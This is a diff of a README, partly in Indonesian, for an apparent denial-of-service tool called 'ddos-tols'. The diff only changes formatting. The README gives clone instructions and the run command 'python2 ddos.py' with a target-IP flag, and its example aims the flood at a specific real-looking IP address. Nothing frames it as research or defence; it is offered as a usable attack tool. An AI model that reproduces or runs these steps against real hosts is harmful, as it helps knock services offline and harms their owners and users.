@@ -1,11 +1,11 @@
 # DDOS TOLS ERROR CODE
 
 ## 1. Download Script
-- ```git clone https://www.github.com/firdaus-rx/ddos-tols```
-- ```cd ddos-tols```
+- <code>git clone https://www.github.com/firdaus-rx/ddos-tols</code>
+- <code>cd ddos-tols</code>
 
 ## 2. Jalankan Tols 
-- ```python2 ddos.py -t [IP_TARGET] -r [--resource]```
+- <code>python2 ddos.py -t [IP_TARGET] -r [--resource]</code>
 
 ## 3. Example 
-- ```python2 ddos.py -t 141.124.13.12 -r 1000 ```
+- <code>python2 ddos.py -t 141.124.13.12 -r 1000</code>
